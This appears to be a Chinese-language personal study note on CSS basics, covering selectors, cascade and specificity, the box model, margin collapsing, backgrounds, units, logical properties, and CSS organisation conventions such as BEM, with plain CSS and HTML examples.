邻接兄弟选择器（+）用来选中恰好处于另一个在继承关系上同级的元素旁边的物件。例如，选中所有紧随&lt;p&gt;元素之后的&lt;img&gt;元素： 123456h1 + p &#123; font-weight: bold; background-color: #333; color: #fff; padding: .5em;&#125; 通用兄弟 如果你想选中一个元素的兄弟元素，即使它们不直接相邻，你还是可以使用通用兄弟关系选择器（~）。要选中所有的&lt;p&gt;元素后任何地方的&lt;img&gt;元素，我们会这样做： 123456h1 ~ p &#123; font-weight: bold; background-color: #333; color: #fff; padding: .5em;&#125; 层叠与继承 层叠 当应用两条同级别的规则到一个元素的时候，写在后面的是实际使用的规则 例如如下两条规则，将会生效后面的蓝色规则： 123456h1 &#123; color: red; &#125;h1 &#123; color: blue; &#125; 优先级 浏览器是根据优先级来决定当多个规则有不同选择器对应相同的元素的时候需要使用哪个规则。它基本上是一个衡量选择器具体选择哪些区域的尺度： 一个元素选择器不是很具体，则会选择页面上该类型的所有元素，所以它的优先级就会低一些。 一个类选择器稍微具体点，则会选择该页面中有特定 class 属性值的元素，所以它的优先级就要高一点。 继承 某些父元素上的CSS属性可以被子元素继承例如color和font-family是会被子元素继承的 再如width是不可继承的 关于一个属性能否被继承，可以再MDN CSS属性参考页面查看，以 color 属性的形式定义部分为例。 CSS为控制继承提供了五个特殊的通用属性值。每个CSS属性都接收这些值 inherit 使子元素继承父元素 intial 使应用于选定元素的属性值设置为该属性的初始值 revert 将应用于选定元素的属性值重置为浏览器的默认样式，而不是应用于该属性的默认值。在许多情况下，此值的作用类似于 unset。 revert-layer 将应用于选定元素的属性值重置为在上一个层叠层中建立的值。 unset 将属性重置为自然值，也就是如果属性是自然继承那么就是 inherit，否则和 initial 一样 重设所有属性值 CSS 的简写属性 all 可以用于同时将这些继承值中的一个应用于（几乎）所有属性。它的值可以是其中任意一个（inherit、initial、unset 或 revert）。这是一种撤销对样式所做更改的简便方法，以便回到之前已知的起点。 下面的示例中有两个块级引用元素。第一个用元素本身的样式，第二个设置 all 为 unset 12345678blockquote &#123; background-color: orange; border: 2px solid blue;&#125; .fix-this &#123; all: unset;&#125; 1234567&lt;blockquote&gt; &lt;p&gt;This blockquote is styled&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote class=&quot;fix-this&quot;&gt; &lt;p&gt;This blockquote is not styled&lt;/p&gt;&lt;/blockquote&gt; 理解层叠 需要理解层叠样式就需要考虑如下三个重点： 资源顺序 优先级 重要程度 资源顺序 资源顺序体现在： 优先级相同的样式，后面的规则将被应用 优先级 浏览器对于优先级的计算是，对不同类型的选择器给与不同的分数值，把这些分数相加就得到特定选择器的权重，然后进行匹配。 一个选择器优先级可以由三个不同的值（或分量）相加，可以认为是百（ID）- 十（类）- 个（元素）——三位数： ID：类选择器中包含ID选择器则百位得一分 类：选择器中包含类选择器、属性选择器或者伪类则十位得一分 元素：选择器中包含元素、伪元素选择器则个位得一分 注意事项： 通用选择器（*）、组合符（+、&gt;、~、’ '）和调整优先级的选择器（:where()）不会影响优先级。 否定（:not()）和任意匹配（:is()）伪类本身对优先级没有影响，但它们的参数则会带来影响。参数中，对优先级算法有贡献的参数的优先级的最大值将作为该伪类选择器的优先级。 选择器 ID 类 元素 优先级 h1 0 0 1 0-0-1 h1 + p::first-letter 0 0 3 0-0-3 li &gt; a[href*=&quot;en-US&quot;] &gt; .inline-warning 0 2 2 0-2-2 #identifier 1 0 0 1-0-0 button:not(#mainBtn, .cta) 1 0 1 1-0-1 内联样式 即style属性内的样式，可以理解为优先级分数为1-0-0-0，即无论如果内敛样式的优先级最高 !important 一个特殊的CSS用来覆盖上述所有优先级计算，但是建议除了非常情况不要使用 1234.better &#123; background-color: gray; border: none !important;&#125; 注意事项 覆盖 !important 唯一的办法就是另一个 !important 具有相同优先级而且顺序靠后，或者更高优先级。 覆盖声明的顺序 相互冲突的声明将按以下顺序应用，后一种声明将覆盖前一种声明： 用户代理样式表中的声明（例如，浏览器的默认样式，在没有设置其他样式时使用）。 用户样式表中的常规声明（由用户设置的自定义样式）。 作者样式表中的常规声明（这些是我们 web 开发人员设置的样式）。 作者样式表中的 !important 声明 用户样式表中的 !important 声明 用户代理样式表中的 !important 声明 级联层的顺序 尽管级联层属于高级的主题，你可能不会立刻使用此特性，但了解层是如何级联的非常重要。 在级联层中声明 CSS 是，优先级的顺序由声明层的顺序来决定。在任何层之外声明的 CSS 样式会被按声明的顺序组合在一起，形成一个未命名的层，它会被当作最后声明的层。对于存在冲突的常规（没有 !important 声明）样式，后面的层比先前定义的层的优先级高。但对于带有 !important 标记的样式，其顺序相反——先前的层中的 important 样式比后面的层以及为在层中声明的 important 样式优先级要高。但内联样式比所有作者定义的样式的优先级都要高，不受级联层规则的影响。 当你在不同的层中有多个样式块，且其中提供了对于某一元素的单一属性的相互冲突的值时，声明该冲突样式的层的顺序将决定其优先级。而不是高优先级的层直接覆盖低优先级的层中的所有样式。需要注意的是单独的一个层中的样式的优先级仍旧会起作用。 12345678910111213141516171819202122232425262728@layer firstLayer, secondLayer;p &#123; /* 0-0-1 */ background-color: red; color: grey !important; border: 5px inset purple;&#125;p#addSpecificity &#123; /* 1-0-1 */ border-style: solid !important;&#125;@layer firstLayer &#123; #addSpecificity &#123; /* 1-0-0 */ background-color: blue; color: white !important; border-width: 5px; border-style: dashed !important; &#125;&#125;@layer secondLayer &#123; p#addSpecificity &#123; /* 1-0-1 */ background-color: green; color: orange !important; border-width: 10px; border-style: dotted !important; &#125;&#125; 盒模型 CSS将HTML中的元素视为一个个盒子（box）,CSS中广泛使用的两种盒子有： 块级盒子（block box） 内联盒子（inline box） 这两种盒子的表现会有所区别 块级盒子 块级盒子会表现如下特征： 盒子会在内联的方向上扩展，并占据父容器在该方向的所有空间 通常情况下盒子会与父容器一样宽 每个盒子独占一行 width和height会起作用 padding、margin、border会将其他元素推开 默认状态下为块级盒子的标签有&lt;p&gt;、&lt;h1&gt; 内联盒子 内联盒子会表现如下特征： 盒子不会产生换行 width和height不起作用 垂直方向的的内边距和外边距会被应用，但不会把其他处于inline状态的盒子推开 水平方向的内边距和外边距会被应用且会把其他处于inline状态的盒子推开 用做链接的 &lt;a&gt; 元素、 &lt;span&gt;、 &lt;em&gt; 以及 &lt;strong&gt; 都是默认处于 inline 状态的。 可以通过属性display切换inline和block的状态 内部和外部显示类型 盒子除了外部显示类型，还有内部显示类型。 内部显示类型决定了盒子内部元素是如何布局的，默认情况下按照正常文档流布局，即与其它内联以及快元素一样 此外，还可以通过display: flex将内部元素变为flex元素，此时外部显示类型为block，内部显示类型为felx 除了flex还有grid inline-flex会将内部类型设置为flex的同时将外部类型设置为inline 块级和内联布局是 web 上默认的行为 —— 正如上面所述，它有时候被称为 正常文档流 什么是盒模型 完整的CSS和模型应用于块级盒子，内联盒子只使用和模型中定义的部分内容。 盒的各个部分 **Content box：**用于显示内容的区域，大小可以通过width和height来设置 **Padding box：**包围在内容外部的空白区域，大小可以通过padding相关属性设置 **Border box：**边框包裹内容和内边距。大小通过border来设置 **Margin box：**最外层区域，与其他盒子之间的空白区域，大小通过margin设置 标准盒模型 我们尝试给一个盒模型设置width, border, padding, margin: 1234567.box &#123; width: 350px; height: 150px; margin: 25px; padding: 25px; border: 5px solid black;&#125; 那么这个盒子的实际宽高分别是： 宽度 = (350 + 25 * 2 + 5 * 2) = 410px 高度 = (150 + 25 * 2 + 5 * 2) = 210px 注意事项： margin不计入实际大小，它会影响盒子在页面所占空间，但是影响的是盒子外部空间。盒子的范围到边框为止 —— 不会延伸到 margin。 替代（IE）盒模型 为了避免盒子大小不够直观（即计算实际宽度时还需要加上边框和内边距）CSS还提供了替代盒模型。该模型认为设置的宽度即为所有可见宽度 使用相同的配置： 1234567.box &#123; width: 350px; height: 150px; margin: 25px; padding: 25px; border: 5px solid black;&#125; 得到的宽高为： 宽 = 350px 高 = 150px 这一选项通过设置box-sizing属性得到： 123.box &#123; box-sizing: border-box;&#125; 如果希望所有模型都为替代盒模型，可以通过如下配置实现 123456html &#123; box-sizing: border-box;&#125;*, *::before, *::after &#123; box-sizing: inherit;&#125; 备注： 一个有趣的历史记录 ——Internet Explorer 默认使用替代盒模型，没有可用的机制来切换。（译者注：IE8+ 支持使用 box-sizing 进行切换） margin，border，padding margin，border，padding三者是属性的简写，允许我们一次性控制盒子的四个边 margin margin用来推开盒子周围的元素，它总是在计算可见部分后额外添加的，包含以下四个单独控制的属性 margin-top margin-right margin-bottom margin-left margin可以接受负数，这样会使得其他元素与该盒子重叠 margin折叠 有时候当两个相邻盒子都设置了margin时，会发生与直觉不相符的情况。 原因时margin属性存在折叠的特性： 两个外边距相接的元素，两个外边距将会合并为一个外边距，即量大的单个外边距的大小 如果我们有下面的一段HTML 1234&lt;div class=&quot;container&quot;&gt; &lt;p class=&quot;one&quot;&gt;I am paragraph one.&lt;/p&gt; &lt;p class=&quot;two&quot;&gt;I am paragraph two.&lt;/p&gt;&lt;/div&gt; 接下来我们为两个p标签设置宽高 1234567.one &#123; margin-bottom: 50px;&#125;.two &#123; margin-top: 30px;&#125; 此时两个p标签之间的上下间隔为50px，而不是我们直觉的50+30=80px 下面给出边距折叠的定义 块的上外边距 (margin-top)和下外边距 (margin-bottom)有时合并 (折叠) 为单个边距，其大小为单个边距的最大值 (或如果它们相等，则仅为其中一个)，这种行为称为边距折叠。 margin折叠的情况有如下几种： 同一层相邻元素之间 相邻的两个元素之间的外边距重叠，除非后一个元素加上clear-fix 清除浮动。 1234567891011&lt;style&gt;p:nth-child(1)&#123; margin-bottom: 13px;&#125;p:nth-child(2)&#123; margin-top: 87px;&#125;&lt;/style&gt;&lt;p&gt;下边界范围会...&lt;/p&gt;&lt;p&gt;...会跟这个元素的上边界范围重叠。&lt;/p&gt; 没有内容将父元素和后代元素分开 发生于父元素与其后代元素之间 如果没有边框border，内边距padding，行内内容，也没有创建块级格式上下文或清除浮动来分开一个块级元素的上边界margin-top 与其内一个或多个后代块级元素的上边界margin-top 或没有边框，内边距，行内内容，高度height，最小高度min-height或 最大高度max-height 来分开一个块级元素的下边界margin-bottom与其内的一个或多个后代后代块元素的下边界margin-bottom 则就会出现父块元素和其内后代块元素外边界重叠，重叠部分最终会溢出到父级块元素外面。 如下面的例子 1234567891011121314151617181920&lt;style type=&quot;text/css&quot;&gt;section &#123; margin-top: 13px; margin-bottom: 87px;&#125;header &#123; margin-top: 87px;&#125;footer &#123; margin-bottom: 13px;&#125;&lt;/style&gt;&lt;section&gt; &lt;header&gt;上边界重叠 87&lt;/header&gt; &lt;main&gt;&lt;/main&gt; &lt;footer&gt;下边界重叠 87 不能再高了&lt;/footer&gt;&lt;/section&gt; 其中header的上边界87px高于selction的13px，于是超出了父元素section（阴影部分），并与父元素的上边界发生了重叠。使得sectiond到页面顶点的实际距离达到了87px 同时footer的下边界与父元素section的下边界也发生了堆叠，导致下边界到section底部的实际距离为0 空的块元素 当一个块元素上边界margin-top 直接贴到元素下边界margin-bottom时也会发生边界折叠。 这种情况会发生在一个空的块元素完全没有设定边框border、内边距padding、高度height、最小高度min-height、最大高度max-height、内容设定为 inline 或是加上clear-fix的时候。 12345678910111213&lt;style&gt;p &#123; margin: 0;&#125;div &#123; margin-top: 13px; margin-bottom: 87px;&#125;&lt;/style&gt;&lt;p&gt;下边界范围是 87 ...&lt;/p&gt;&lt;div&gt;&lt;/div&gt;&lt;p&gt;... 上边界范围是 87&lt;/p&gt; 注意事项： 上述情况的组合会产生更复杂的外边距折叠。 即使某一外边距为 0，这些规则仍然适用。因此就算父元素的外边距是 0，第一个或最后一个子元素的外边距仍然会“溢出”到父元素的外面。 如果参与折叠的外边距中包含负值，折叠后的外边距的值为最大的正边距与最小的负边距（即绝对值最大的负边距）的和，；也就是说如果有 -13px 8px 100px 叠在一起，边界范围的技术就是 100px -13px 的 87px。 如果所有参与折叠的外边距都为负，折叠后的外边距的值为最小的负边距的值。这一规则适用于相邻元素和嵌套元素。 border 在标准盒模型中，边框大小将会被添加到盒子的高宽计算中 在替代盒模型中，边框会使得盒子的内容区域变小 边框属性可以设置： 宽高 颜色 样式 padding 内边距无法设置为负数，应用于元素的任何背景都将显示在内边距后面 盒子模型与内联盒子 以上属性还可以应用在内联盒子，但： 宽度喝高度会被忽略 边框和内边距会生效，但是不会改变其他内容与内联盒子的关系 外边距将在水平距离生效 1234567891011121314&lt;style&gt;span &#123; margin: 10px; padding: 20px; width: 80px; height: 50px; background-color: lightblue; border: 2px solid blue;&#125;&lt;/style&gt;&lt;p&gt; I am a paragraph and this is a &lt;span&gt;span&lt;/span&gt; inside that paragraph. A span is an inline element and so does not respect width and height.&lt;/p&gt; inline-block display属性有一个特殊的值inline-block提供了一个处于块与内联之间的状态 一个inline-block元素具有以下特性： width和height可以生效 padding,margin，以及border会推开其他元素 但并不会独占一行。 依然是上面的例子，可以看出inline-block的区别 123456789101112131415&lt;style&gt;span &#123; margin: 10px; padding: 20px; width: 80px; height: 50px; background-color: lightblue; border: 2px solid blue; display: inline-block;&#125;&lt;/style&gt;&lt;p&gt; I am a paragraph and this is a &lt;span&gt;span&lt;/span&gt; inside that paragraph. A span is an inline element and so does not respect width and height.&lt;/p&gt; 这种元素通常被用在导航栏中，为了让使用flexbox显示的一行a标签能够根据鼠标的停留更改背景颜色，我们需要让他有比内部文字更大的大小： 123456789101112131415161718192021&lt;style&gt;.links-list a &#123; background-color: rgb(179,57,81); color: #fff; text-decoration: none; padding: 1em 2em; display: inline-block;&#125;.links-list a:hover &#123; background-color: rgb(66, 28, 40); color: #fff;&#125;&lt;/style&gt;&lt;nav&gt; &lt;ul class=&quot;links-list&quot;&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Link one&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Link two&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Link three&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/nav&gt; 总结 元素模式 元素排列 设置样式 默认宽度 包含 块级元素 一行只能放一个块级元素 可以设置宽度和高度 容器的100% 可以包含任意元素，p无法包含div 行内元素 一行可以放多个行内元素 不可直接设置宽高 本身内容的宽度 可包含文本，或其他行内元素 行内块元素 一行可以放多个行内元素 可以设置宽度和高度 本身内容的宽度 背景 颜色 background-color 图像 background-image 当使用比盒子大的图片作为背景时，默认会从图片的左上角开始渲染，且仅渲染盒子范围的图片范围。 当使用比盒子小的图片作为背景时，默认会让图片复制铺满整个盒子。 可以通过background-repeat来控制图像的平铺行为 no-repeat——阻止背景重复平铺。 repeat-x——仅水平方向上重复平铺。 repeat-y——仅垂直方向上重复平铺。 repeat——默认值，在水平和垂直两个方向重复平铺。 还可以通过background-size来设置背景图片的大小，值可以是长度或百分比。 此外还可以使用两个关键字值： cover：浏览器将使图像足够大，使它完全覆盖了盒子区域，同时仍然保持其宽高比。在这种情况下，图像的部分区域可能会跳出盒子外。 contain：浏览器会将图像调整到适合框内的尺寸。在这种情况下，如果图像的长宽比与盒子的长宽比不同，会在图像的两边或顶部和底部出现空隙。 背景定位 background-position 属性允许你选择背景图片出现在它所应用的盒子上的位置。这使用了一个坐标系统，其中方框的左上角是 (0,0)，方框沿水平（x）和垂直（y）轴定位。 该属性可以接受长度和百分比作为值 同时也接受关键字： top right center … 还支持使用四值语法来指示到盒子的某些边的距离 12345.box &#123; background-image: url(star.png); background-repeat: no-repeat; background-position: top 20px right 10px;&#125; 长度单位是相对于其前面的值的偏移量。 备注： background-position 是background-position-x和 background-position-y的简写，它们允许用户分别设置不同的坐标轴的值。 渐变背景 使用渐变的一个有趣的方法是使用网络上许多 CSS 渐变生成器中的一个，比如这个。 可以像图片一样进行设置，但需要使用linear-gradient()函数来实现，例如： 12345678.a &#123; background-image: linear-gradient(105deg, rgba(0,249,255,1) 39%, rgba(51,56,57,1) 96%);&#125;.b &#123; background-image: radial-gradient(circle, rgba(0,249,255,1) 39%, rgba(51,56,57,1) 96%); background-size: 100px 50px;&#125; 多背景图片 也可以有多个背景图像——在单个属性值中指定多个 background-image 值，用逗号分隔每个值。 这样做会出现背景图片相互重叠的情况。背景将分层，最后列出的背景图片位于最下层，而之前的每张图片都堆在代码中紧随其后的那张图片之上。 其他 background-* 属性也可以像 background-image 一样使用逗号分隔的方式设置： 12345background-image: url(image1.png), url(image2.png),url(image3.png),url(image4.png);background-repeat: no-repeat, repeat-x, repeat;background-position: 10px 20px, top right; 不同属性的每个值，将与其他属性中相同位置的值匹配。 但当数量无法匹配时，较小数量的值会循环匹配 即如果有四张图片，但是位置只有两个值的话，前两个图片会引用这两个位置值的属性，然后image3会应用position1，image3会引用position2，以此循环 背景附加 background-attachment属性控制滑动时背景的呈现方式，取值有： scroll：使元素的背景在页面滚动时滚动。如果滚动了元素内容，则背景不会移动。实际上，背景被固定在页面的相同位置，所以它会随着页面的滚动而滚动。 fixed：使元素的背景固定在视口上，这样当页面或元素内容滚动时，它就不会滚动。它将始终保持在屏幕上相同的位置。 local：将背景固定在它所设置的元素上，所以当你滚动该元素时，背景也随之滚动。 background简写属性 使用单个background进行控制时需要注意以下规则： background-color 只能在最后一个逗号之后指定。 background-size 值只能立即包含在 background-position 之后，用“/”字符分隔，例如：center/80%。 123456.box &#123; background: linear-gradient(105deg, rgba(255,255,255,.2) 39%, rgba(51,56,57,1) 96%) center center / 400px 200px no-repeat,url(big-star.png) center no-repeat, rebeccapurple;&#125; 边框 我们可以利用border来配合构建一些更有意思的边框： 1234567891011121314151617181920212223&lt;style&gt;.box &#123; background-color: #567895; border: 5px solid #0b385f; border-bottom-style: dashed; border-radius: 1em; border-top-right-radius: 10% 30%; color: #fff;&#125;h2 &#123; border-top: 2px dotted rebeccapurple; border-bottom: 1em double rgb(24, 163, 78);&#125;&lt;/style&gt;&lt;html&gt; &lt;body&gt; &lt;div class=&quot;box&quot;&gt; &lt;h2&gt;Borders&lt;/h2&gt; &lt;p&gt;Try changing the borders.&lt;/p&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 文本 文本方向 可以使用writing-mode: vertical-rl对文本的显示进行设置 该属性有三个取值： horizontal-tb:块流向从上至下。对应为横向文本 vertical-rl:块流向从右向左。对应文本为纵向 vertical-lr:块流向从左向右。对应的文为纵向 书写模式与块、内联布局 块级显示和内联显示与文本的书写模式密切相关 例如，如果使用书写模式的显示是横向的，如英文，那么块在页面上的显示就是从上到下的 1234567.horizontal &#123; writing-mode: horizontal-tb;&#125;.vertical &#123; writing-mode: vertical-rl;&#125; 当我们修改书写模式时，也在改变块和内联文本的方向。 例如上述代码中： horizontal-tb块的方向是从上到下的横向。 vertical-rl块的方向是从右到左的纵向。 即： 块维度指的是块在页面书写模式下的显示方向 内联维度指的是文本方向 逻辑属性和逻辑值 对于上述的两个盒子，如果我们给这两个盒子设定宽度。 1234567891011.box &#123; width: 150px;&#125;.horizontal &#123; writing-mode: horizontal-tb;&#125;.vertical &#123; writing-mode: vertical-rl;&#125; 当盒子处于纵向书写模式下时，宽度也发生了变化，从而导致文本超出了盒子的范围。 因此CSS使用了一套尺寸映射的属性： width被称作内联尺寸inline-size height被称作内联尺寸block-size 上述代码使用inline-size代替width后box将会随内容宽度变化 逻辑外边距、边框和内边距属性 除了width和height外，margin,padding,border等等也都有相应的映射，例如： margin-top映射到margin-block-start，总是指向块级维度开始处的边距 padding-left映射到padding-inline-start，应用到内联开始方向上的内边距 border-bottom映射到border-block-end，引用到块级维度结尾处的边框 逻辑值 除了上述这些物理属性有逻辑属性的对应外 类似: top——block-start right——inline-end bottom——block-end left——inline-start 如何使用 逻辑属性是在物理属性之后出现的，因而最近才开始在浏览器中应用。你可以通过查看 MDN 的属性页面来了解浏览器对逻辑属性的支持情况。如果你并没有应用多种书写模式，那么现在你可能更倾向于使用物理属性，因为这些在你使用弹性布局和网格布局时非常有用。 溢出处理 由于CSS的万物皆盒的设计理念，遇到盒子无法装下其中的内容时，溢出就会发生，CSS对这些现象也有自己的处理 CSS尽力减少“数据损失” 即默认情况下，CSS对于溢出的内容采用直接显示的策略： 1234567891011&lt;style&gt;.box &#123; border: 1px solid #333333; width: 200px; height: 100px;&#125;&lt;/style&gt;&lt;div class=&quot;box&quot;&gt;This box has a height and a width. This means that if there is too much content to be displayed within the assigned height, there will be an overflow situation. If overflow is set to hidden then any overflow will not be visible.&lt;/div&gt;&lt;p&gt;This content is outside of the box.&lt;/p&gt; OverFlow属性 用于控制溢出内容的显示方式，默认取值为visible即即使发生溢出了一样会将内容显示出来。 可用取值如下： visible直接显示 hidden隐藏溢出内容 scroll允许滑动以保证完全显示（无论何时都会显示滚动条） 可以使用overflow-x,overflow-y两个属性控制滑动的方向 auto当内容发生溢出时才显示滚动条 溢出建立了块级排版上下文 CSS 中有所谓块级排版上下文（Block Formatting Context，BFC）的概念。 此处不过多介绍，在使用诸如scroll或者auto的时候，就建立了一个块级排版上下文。 结果就是，改变了overflow的值的话，对应的盒子就变成了更加小巧的状态。在容器之外的东西没法混进容器内，也没有东西可以突出盒子，进入周围的版面。激活了滚动动作，你的盒子里面所有的内容会被收纳，而且不会遮到页面上其他的物件。 CSS值与单位 数字长度、百分比 数值类型 数值类型 描述 &lt;integer&gt; &lt;integer&gt; 是一个整数，比如 1024 或 -55。 &lt;number&gt; &lt;number&gt; 表示一个小数——它可能有小数点后面的部分，也可能没有，例如 0.255、128 或 -1.2。 &lt;dimension&gt; &lt;dimension&gt; 是一个 &lt;number&gt; 它有一个附加的单位，例如 45deg、5s 或 10px。&lt;dimension&gt; 是一个伞形类别，包括 &lt;length&gt;、&lt;angle&gt;、&lt;time&gt; 和 &lt;resolution&gt; 类型。 &lt;percentage&gt; &lt;percentage&gt; 表示一些其他值的一部分，例如 50%。百分比值总是相对于另一个量。例如，一个元素的长度相对于其父元素的长度。 长度 最常见的数字类型是 &lt;length&gt;例如 10px（像素）或 30em。CSS 中有两种类型的长度——相对长度和绝对长度。 绝对长度单位 绝对长度与任何东西都没有关系，通常认为总是相同的大小 单位 名称 等价换算 cm 厘米 1cm = 37.8px = 25.2/64in mm 毫米 1mm = 1/10th of 1cm Q 四分之一毫米 1Q = 1/40th of 1cm in 英寸 1in = 2.54cm = 96px pc 派卡 1pc = 1/6th of 1in pt 点 1pt = 1/72th of 1in px 像素 1px = 1/96th of 1in 相对长度单位 单位 相对于 em 在 font-size 中使用是相对于父元素的字体大小，在其他属性中使用是相对于自身的字体大小，如 width。 ex 字符“x”的高度。 ch 数字“0”的宽度。 rem 根元素的字体大小。 lh 元素的行高。 rlh 根元素的行高。当用于根元素的 font-size 或 line-height 属性时，它指的是这些属性的初始值。 vw 视口宽度的 1%。 vh 视口高度的 1%。 vmin 视口较小尺寸的 1%。 vmax 视口大尺寸的 1%。 vb 在根元素的块向上，初始包含块的尺寸的 1%。 vi 在根元素的行向上，初始包含块的尺寸的 1%。 svw、svh 分别为视口较小尺寸的宽度和高度的 1%。 lvw、lvh 分别为视口大尺寸的宽度和高度的 1%。 dvw、dvh 分别为动态视口的宽度和高度的 1%。 其中em和rem的差别在于前者是依据父元素的字体大小，而后者是依据根节点的字体大小 因此，如果我们定义一组嵌套li元素的字体为1.3em时，字体会逐渐变大： 1234567891011121314151617181920212223&lt;style&gt;html &#123; font-size: 16px;&#125;.ems li &#123; font-size: 1.3em;&#125;&lt;/style&gt;&lt;ul class=&quot;ems&quot;&gt; &lt;li&gt;One&lt;/li&gt; &lt;li&gt;Two&lt;/li&gt; &lt;li&gt;Three &lt;ul&gt; &lt;li&gt;Three A&lt;/li&gt; &lt;li&gt;Three B &lt;ul&gt; &lt;li&gt;Three B 2&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/li&gt;&lt;/ul&gt; 当我们使用百分比作为值的时候 如果将元素的字体大小设置为百分比，那么它将是元素父元素字体大小的百分比。如果使用百分比作为宽度值，那么它将是父值宽度的百分比。 颜色 颜色允许接受许多值，例如： 颜色关键字 十六进制RGB值 RGB和RGBA值 HSL和HSLA值 备注： 在颜色上设置 alpha 通道与使用 opacity 属性有一个关键区别: 当使用opacity时，能让元素和它里面的所有东西都不透明，而使用 RGB 与 alpha 参数的颜色只让指定的颜色不透明。 HSL值的方式与RGB略有不同，它使用以下三个通道来定义颜色： 色调：0-360，表示色轮中不同角度的值color wheel (en-US) 饱和度：百分比，0 为无颜色（它将显示为灰色阴影），100% 为全色饱和度 亮度：百分比，其中 0 表示没有光（它将完全显示为黑色），100% 表示完全亮（它将完全显示为白色） HSLA中的A仍然表示不透明度，与RGBA中的相同 图片 可以通过url()指向实际文件，也可以接受一个渐变函数返回的值 位置 可以使用关键字（如 top、left、bottom、right 以及 center）将元素与 2D 框的特定边界对齐，以及表示框的顶部和左侧边缘偏移量的长度。 字符串和标识符 例如使用:after,:before这些生成内容时，即可以使用CSS字符串来定义生成的内容 字符串使用“”来与关键字进行区分 CSS中调整大小 这里特别指出使用百分比作为margin,padding的值 1234567891011&lt;style&gt;.box &#123; border: 5px solid darkblue; width: 300px; margin: 10%; padding: 10%;&#125;&lt;/style&gt;&lt;div class=&quot;box&quot;&gt; I have margin and padding set to 10% on all sides.&lt;/div&gt; 给了里面的盒子 10% 的 margin 以及 10% 的 padding。盒子底部和顶部的内外边距，和左右外边距有同样的大小。 或许，你期望元素的上下外边距是其高度的百分比，元素的左右外边距是其宽度的百分比。但情况并非如此！ 使用百分比作为元素外边距（margin）或填充（padding）的单位时，值是以包含块的**内联尺寸inline-size**进行计算的，也就是元素的水平宽度 min-,max-尺寸 除了运用这两个属性避免盒子过大或者过小无法显示左右内容 max-width 的常见用法为，在没有足够空间以原有宽度展示图像时，让图像缩小，同时确保它们不会比这一宽度大。 即让图像根据盒子大小进行缩放，但不会超过图片原有大小： 12345678910111213141516171819&lt;style&gt;.box &#123; width: 200px;&#125;.minibox &#123; width: 50px;&#125;.width &#123; width: 100%;&#125;.max &#123; max-width: 100%;&#125;&lt;/style&gt;&lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;box&quot;&gt;&lt;img src=&quot;star.png&quot; alt=&quot;star&quot; class=&quot;width&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box&quot;&gt;&lt;img src=&quot;star.png&quot; alt=&quot;star&quot; class=&quot;max&quot;&gt;&lt;/div&gt; &lt;div class=&quot;minibox&quot;&gt;&lt;img src=&quot;star.png&quot; alt=&quot;star&quot; class=&quot;max&quot;&gt;&lt;/div&gt;&lt;/div&gt; 这个技术是用来让图片可响应的 视口单位 单位vh,vw根据视口来定义需要显示的百分比，视口大小的变化也会让它们的大小变化 视口，被认为是浏览器显示网页窗口时的大小 组织CSS 如何组织自己的CSS，让它更易于维护也是一个很重要的事情，通常具有以下几个注意事项： 将CSS格式化为易读的形式 为CSS加注释 在CSS中加入逻辑段落 避免太特定的选择器 将大样式表分成几个小样式表 此外还有一些辅助便携的工具，例如面对对象CSS即OOCSS 核心思想是尽量将共同的属性设置抽离为一个新的类。 例如： 12345678910111213141516171819202122.comment &#123; display: grid; grid-template-columns: 1fr 3fr;&#125;.comment img &#123; border: 1px solid grey;&#125;.comment .content &#123; font-size: .8rem;&#125;.list-item &#123; display: grid; grid-template-columns: 1fr 3fr; border-bottom: 1px solid grey;&#125;.list-item .content &#123; font-size: .8rem;&#125; 其中.comment和.list-item基本相同除了.list-item具有一个底边，那么我们可以将相同的属性抽离为一个新的类 12345678910111213141516.media &#123; display: grid; grid-template-columns: 1fr 3fr;&#125;.media .content &#123; font-size: .8rem;&#125;.comment img &#123; border: 1px solid grey;&#125; .list-item &#123; border-bottom: 1px solid grey;&#125; BEM命名规则 BEM即指Block，Element，Modifier；块、元素、修饰符 B 功能独立的页面元素（或简单或复杂）被视作一个块，它的 CSS 类名具有唯一性，块的特点： 块的命名用来描述这个块的用途 块不应影响它自身所处的环境，意味着不应为块设置外置的几何（margin）或者位置属性 不要使用 CSS 标签选择器 和 ID 选择器 块的使用规则： 块之间可以相互嵌套 可以使用任意多的嵌套层级 E 元素则是块的组成部分，无法脱离块单独使用 元素的特点： 元素的命名用来描述这个元素的用途 元素的整个命名结构是 block-name__element-name 元素使用规则： 元素之间可以相互嵌套 可以使用任意多的嵌套层级 一个元素应始终是其块的组成部分，而不是其他元素的。这意味着元素命名不应被定义成类似层级如 block__elm1__elm2 M 修饰符用来定义元素和块的外观、状态或者行为 修饰符的特点如下： 修饰符的命名用来描述： 外观：size_s，theme_islands 状态：disabled，focused 行为：directions-left-top 用单下划线 _ 来分割修饰符与块或元素的命名 当修饰符的存在与否起主要影响时使用 Boolean 类型 命名遵循如下形式： blockName--modifierName blockName__elementName--modifierName 即__表示下级元素 --表示修饰状态 具体例子如下： 1234567891011121314.overview &#123;&#125; /* 块 */.overview__row &#123;&#125; /* 元素 */.overview__row--right &#123;&#125; /* 修饰符 *//* 嵌套写法 *//* 其中&amp;表示嵌套层的上一级 */.overview &#123; &amp;__row&#123; &amp;__right&#123; &#125; &#125; &amp;__row--right &#123; &#125;&#125; 详细请参考BEM — Naming (getbem.com) 其他体系 此外还有一些体系例如： SMACSS：Scalable and Modular Architecture for CSS (SMACSS) ITCSS：ITCSS 原本Yahoo创造的ACSS：Atomic CSS (ACSS) CSS的构建体系 而偶尔为了更程序化地编写CSS，较为流行的工具有Sass 可以很方便的提供一些预处理和后处理 此外还有一些可以对CSS进行后处理的工具，例如cssnano，可以将CSS文件中的额外的注释和空格去掉来优化CSS Emmet语法 用于Html和css的代码快速生成： html： 语法 效果 div 生成&lt;div&gt;&lt;/div&gt; div*3 生成3对标签 ul &gt; li 生成2对父子关系标签 div+p 生成2对兄弟关系标签 div.demo或div#two 生成带有类名或id名的标签 div.demo$*5 生成5对类名为demo1、demo2、…、demo5的序号自动排序标签 